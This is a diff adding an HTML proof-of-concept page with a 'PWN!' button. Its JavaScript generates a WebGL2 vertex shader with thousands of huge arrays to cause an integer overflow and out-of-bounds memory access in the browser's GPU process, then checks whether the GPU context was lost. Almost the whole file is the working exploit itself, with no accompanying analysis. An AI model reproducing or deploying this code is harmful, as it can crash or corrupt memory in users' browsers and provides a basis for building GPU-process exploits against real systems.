@@ -1,0 +1,177 @@
+<!doctype html>
+<html>
+<head>
+  <title>Simple PoC</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body {
+        font-family: 'SF Pro';
+    }
+
+    pre {
+        white-space: pre-wrap;       /* Since CSS 2.1 */
+        white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
+        white-space: -pre-wrap;      /* Opera 4-6 */
+        white-space: -o-pre-wrap;    /* Opera 7 */
+        word-wrap: break-word;       /* Internet Explorer 5.5+ */
+    }
+  </style>
+</head>
+<body>
+
+    <button onclick="pwn();">PWN!</button>
+    
+    <h2>Log Output</h2>
+    <div><pre id="log">
+    </pre></div>
+
+    <canvas id="canvas"></canvas>
+    <script type="text/javascript">
+      function print(msg) {
+        console.log(`[+] ${msg}`);
+        document.getElementById("log").innerHTML += msg + "\n";
+      }
+
+      var canvas = document.getElementById('canvas');
+      var lostContext = false;
+      canvas.addEventListener(
+        "webglcontextlost",
+        (e) => {
+          print("Lost context, i.e. process crashed!");
+          print(e);
+          lostContext = true;
+        },
+        false
+      );
+
+      function sleep(ms) {
+          return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      function range(size, startAt = 0) {
+        return [...Array(size).keys()].map(i => i + startAt);
+      }
+
+      function arrName(prefix, num) {
+        return `${prefix}${num}`;
+      }
+
+      function hex(num) {
+        return `0x${num.toString(16)}`
+      }
+
+      function genArrDescs(prefix, size, num) {
+        return range(num).map((n) => {
+          return `uvec4 ${arrName(prefix, n)}[${hex(size)}];`;
+        }).join("\n");
+      }
+
+      function genAccessors(prefix, num, varName) {
+        return range(num).map((n) => {
+          return `${varName} += ${arrName(prefix, n)}[0x41];`;
+        }).join("\n");
+      }
+
+      function exploit() {
+        // setup
+        gl = canvas.getContext('webgl2');
+        // vertex shader, contains OOB access!
+        const numLarge = 2047;
+        const numSmall = 1;
+        const largeSize = 0xffff;
+        const smallSize = 0xf400;
+        const largePrefix = "largeBuf";
+        const smallPrefix = "smallBuf";
+
+        const tmpVarName = "tmp";
+
+        const arrayDescs = genArrDescs(largePrefix, largeSize, numLarge) + "\n" + genArrDescs(smallPrefix, smallSize, numSmall);
+        const arrayAccess = genAccessors(largePrefix, numLarge, tmpVarName) + "\n" + genAccessors(smallPrefix, numSmall, tmpVarName);
+
+        const oobSize = 0x100;
+        const init = range(oobSize).map((n) => {
+          return `0x1337`;
+        }).join(",");
+        const oobName = "oob";
+
+        const vertexShaderSource = `#version 300 es
+        // uvec4 buf[0x7ffffff];
+
+        // this is the array causing OOB accesses :)
+        int ${oobName}[${hex(oobSize)}] = int[](${init});
+        // generate all others, we use these to integer overflow :)
+        ${arrayDescs}
+
+        void main() {
+          uvec4 ${tmpVarName} = uvec4(0);
+          ${arrayAccess}
+          // gl_Position = vec4(buf[0x414141]);
+          // ${tmpVarName} += ${arrName(largePrefix, 0)}[0x1001];
+          ${tmpVarName} += uvec4(uint(${oobName}[gl_VertexID]));
+          gl_Position = vec4(${tmpVarName});
+          gl_PointSize = 50.0;
+          // ${oobName}[gl_VertexID+1] = uvec4(uint(0x1338));
+          // buf[0x414141] = uvec4(uint(0x1337));
+        }`
+
+        // print("vertex shader:");
+        // print(vertexShaderSource);
+        const vs = gl.createShader(gl.VERTEX_SHADER)
+        gl.shaderSource(vs, vertexShaderSource)
+        gl.compileShader(vs)
+
+        // Compile the fragment shader
+        const fragmentShaderSource = `#version 300 es
+        precision highp float;
+        out vec4 color;
+        void main() {
+          color = vec4(1, 0, 1, 1);
+        }`
+        const fs = gl.createShader(gl.FRAGMENT_SHADER)
+        gl.shaderSource(fs, fragmentShaderSource)
+        gl.compileShader(fs)
+
+        // Link the program
+        const prog = gl.createProgram()
+        gl.attachShader(prog, vs)
+        gl.attachShader(prog, fs)
+        gl.linkProgram(prog)
+        if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
+          console.error('prog info-log:', gl.getProgramInfoLog(prog))
+          console.error('vert info-log: ', gl.getShaderInfoLog(vs))
+          console.error('frag info-log: ', gl.getShaderInfoLog(fs))
+          print("vertex error:");
+          print(gl.getShaderInfoLog(vs));
+          return;
+        }
+
+        // Use the program
+        gl.useProgram(prog)
+        
+        // Draw the point
+        gl.clearColor(0, 0, 0, 1) // set clear color to black
+        gl.clear(gl.COLOR_BUFFER_BIT) // clear the screen
+        gl.drawArrays(gl.POINTS, 0, 1) // draw 1 point
+        return gl;
+      }
+
+      async function trigger() {
+        exploit();
+        await sleep(2000);
+        await sleep(1000);
+        // if (lostContext) {
+        //   print("Successfully crashed GPU process!");
+        // } else {
+        //   print("!!! Did not manage to crash GPU process!");
+        //   console.error("Did not manage to crash GPU process!");
+        // }
+      }
+
+      function pwn() {
+        trigger();
+      }
+
+    </script>
+</body>
+</html>
